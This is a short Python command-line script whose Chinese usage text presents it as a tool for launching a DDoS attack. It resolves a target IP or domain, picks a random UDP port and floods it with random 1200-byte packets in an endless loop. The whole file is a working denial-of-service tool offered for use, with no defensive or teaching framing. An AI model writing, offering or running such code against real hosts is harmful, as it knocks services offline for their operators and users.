#!/usr/bin/env python3
# coding=utf-8
# date 2018-03-08 17:36:59
# author calllivecn <c-all@qq.com>


import os
import sys
import socket
import random
import ipaddress


def getaddrinfo(domain):
    """
    return: ip
    """
    try:
        addr = socket.getaddrinfo(domain, 0, type=socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
    except socket.gaierror:
        print(f"没有解析以域名: {domain}")
        sys.exit(1)

    return addr[0][-1][0]


def ddos(dest_ip, count=False):

    data = os.urandom(1200)

    port = random.randint(36000, 65000)

    ip = ipaddress.ip_address(dest_ip)

    print(f"目标: {ip}, 端口：{port}")

    if ip.version == 4:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    elif ip.version == 6:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)

    if count:
        for i in range(count):
            sock.sendto(data, (ip.exploded, port))
    else:
        while True:
            sock.sendto(data, (ip.exploded, port))

    sock.close()


def main():
    import argparse

    parse = argparse.ArgumentParser(usage="%(prog)s 发起DDOS攻击")

    group = parse.add_mutually_exclusive_group(required=True)

    group.add_argument("--ip", help="指定ip地址")

    group.add_argument("--domain", help="指定域名地址")

    args = parse.parse_args()

    if args.ip:
        ddos(args.ip)

    elif args.domain:
        ip = getaddrinfo(args.domain)
        ddos(ip)

    else:
        parse.print_help()


if __name__ == "__main__":

    try:
        main()
    except KeyboardInterrupt:
        pass
